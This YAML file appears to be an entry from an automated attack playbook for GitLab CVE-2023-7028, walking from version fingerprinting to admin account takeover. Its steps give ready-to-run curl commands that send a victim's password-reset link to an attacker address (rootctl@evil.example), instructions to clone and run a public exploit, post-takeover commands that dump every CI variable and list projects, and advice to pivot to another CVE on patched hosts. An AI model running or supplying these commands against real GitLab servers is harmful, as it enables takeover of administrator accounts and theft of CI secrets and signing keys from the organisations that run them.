chain_id: gitlab_password_reset_cve_2023_7028
title: "GitLab — CVE-2023-7028 password-reset email-array hijack → any-account takeover"
severity: CRITICAL
tags: [web, gitlab, cve-2023-7028, account-takeover, password-reset]

trigger:
  any_of:
    - { kind: "CVE-2023-7028" }
    - { banner_pattern: "(?i)gitlab" }
    - { product_pattern: "(?i)gitlab" }
    - { path_pattern: "(?i)/users/(sign_in|password)" }

description: |
  GitLab CE/EE 16.1–16.7: the password-reset endpoint accepts the
  `user[email][]` parameter as an array and sends the reset link to
  every email in the array. By including the victim's email AND an
  attacker-controlled email, the attacker receives a working reset
  link. No interaction needed; works against any account including
  `root` / instance admins. The Jan-2024 fix was a one-liner type
  check; thousands of unmaintained installs still vulnerable.

steps:
  - id: 1
    title: "Fingerprint version"
    command: |
      curl -sk "https://$VICTIMA/help" | grep -Eo 'GitLab (Community|Enterprise) Edition [0-9.]+'
      curl -sk "https://$VICTIMA/api/v4/version"

  - id: 2
    title: "Hijack the reset email — array trick"
    command: |
      curl -sk -i "https://$VICTIMA/users/password" -X POST \
        --data-urlencode 'user[email][]=admin@TARGET' \
        --data-urlencode 'user[email][]=rootctl@evil.example' \
        -H "X-CSRF-Token: $(curl -sk 'https://$VICTIMA/users/sign_in' | grep -Po 'csrf-token.+?content="\\K[^"]+' | head -1)"

  - id: 3
    title: "Public PoC (handles the CSRF token automatically)"
    command: |
      git clone https://github.com/ASR511-OO7/cve-2023-7028 /tmp/gl7028
      python3 /tmp/gl7028/exploit.py --target https://$VICTIMA \
        --victim admin@TARGET --attacker rootctl@evil.example

  - id: 4
    title: "Wait for the email, click reset link, set the password"
    command: |
      # Reset link arrives at rootctl@evil.example. Click → set new
      # password → log in as admin@TARGET. Done.

  - id: 5
    title: "Post — admin lets you steal every CI variable + signing key"
    command: |
      # Once logged in as admin:
      curl -sk -H "PRIVATE-TOKEN: $TOKEN" "https://$VICTIMA/api/v4/admin/ci/variables"
      curl -sk -H "PRIVATE-TOKEN: $TOKEN" "https://$VICTIMA/api/v4/projects?per_page=100" | jq '.[].id'

common_errors:
  - error: "API returns the validation error 'Email is invalid'"
    solution: |
      Patched (≥ 16.7.2 / 16.6.4 / 16.5.6 / 16.4.4 / 16.3.6 /
      16.2.8 / 16.1.6). Confirm via `/api/v4/version`. If patched,
      pivot to project-import RCE family (CVE-2023-2825 path
      traversal) for authenticated takeover.

references:
  - https://nvd.nist.gov/vuln/detail/CVE-2023-7028
  - https://about.gitlab.com/releases/2024/01/11/security-release-gitlab-16-7-2-released/
